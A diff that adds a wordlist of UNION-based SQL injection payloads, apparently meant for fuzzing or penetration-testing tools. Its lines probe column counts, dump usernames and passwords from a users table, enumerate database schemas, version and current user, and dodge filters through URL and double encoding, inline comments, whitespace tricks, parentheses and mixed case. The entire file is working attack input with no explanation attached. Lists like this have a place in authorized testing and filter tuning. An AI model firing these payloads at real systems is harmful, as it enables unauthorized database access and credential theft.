@@ -1,0 +1,57 @@
+1 UNION SELECT NULL-- -
+1 UNION SELECT NULL,NULL-- -
+1 UNION SELECT NULL,NULL,NULL-- -
+1 UNION SELECT 1-- -
+1 UNION SELECT 1,2-- -
+1 UNION SELECT 1,2,3-- -
+1 UNION SELECT 1,2,3,4-- -
+1 UNION SELECT 1,2,3,4,5-- -
+1 UNION SELECT NULL,username,password FROM users-- -
+1 UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -
+1 UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
+1 UNION SELECT NULL,@@version,NULL-- -
+1 UNION SELECT NULL,database(),NULL-- -
+1 UNION SELECT NULL,user(),NULL-- -
+1 UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata-- -
+1 UNION ALL SELECT NULL,NULL,NULL-- -
+1 UNION ALL SELECT 1,2,3-- -
+1 UNION ALL SELECT NULL,username,password FROM users-- -
+-1 UNION SELECT 1-- -
+-1 UNION SELECT 1,2-- -
+-1 UNION SELECT 1,2,3-- -
+0 UNION SELECT 1,2,3-- -
+0 UNION SELECT NULL,NULL,NULL-- -
+1' UNION SELECT NULL-- -
+1' UNION SELECT NULL,NULL-- -
+1' UNION SELECT NULL,NULL,NULL-- -
+1' UNION SELECT 1,2,3-- -
+1' UNION SELECT username,password,3 FROM users-- -
+1' UNION SELECT table_name,2,3 FROM information_schema.tables-- -
+1' UNION ALL SELECT NULL,username,password FROM users-- -
+1" UNION SELECT 1,2,3-- -
+# URL-encoded UNION variants
+1+UNION+SELECT+NULL,NULL,NULL--%20-
+1%27+UNION+SELECT+1%2c2%2c3--%20-
+1%2527+UNION+SELECT+1%2c2%2c3--
+1%27+UNION+ALL+SELECT+NULL%2cusername%2cpassword+FROM+users--%20-
+# Comment-bypass UNION
+1'/**/UNION/**/SELECT/**/NULL,user(),NULL-- -
+1'/*!UNION*//*!SELECT*/NULL,version(),NULL-- -
+1 /*!UNION*/ /*!SELECT*/ 1,2,3-- -
+1 UNION/**/SELECT 1,2,3-- -
+1'/*test*/UNION/*test*/SELECT/*test*/1,2,3-- -
+# Tabulation bypass
+1%09UNION%09SELECT%091,2,3-- -
+1%0AUNION%0ASELECT%0A1,2,3-- -
+1	UNION	SELECT	1,2,3-- -
+# Parenthesis bypass
+1 UNION(SELECT 1,2,3)-- -
+1' UNION(SELECT username,password,3 FROM users)-- -
+# Negative ID trick
+-1 UNION SELECT NULL,@@version,NULL-- -
+-1' UNION SELECT NULL,current_user(),NULL-- -
+# Oracle FROM DUAL
+1 UNION SELECT null,null FROM DUAL-- -
+1 UNION SELECT null,user FROM DUAL-- -
+# Mixed case
+1 uNION sELECT 1,2,3-- -
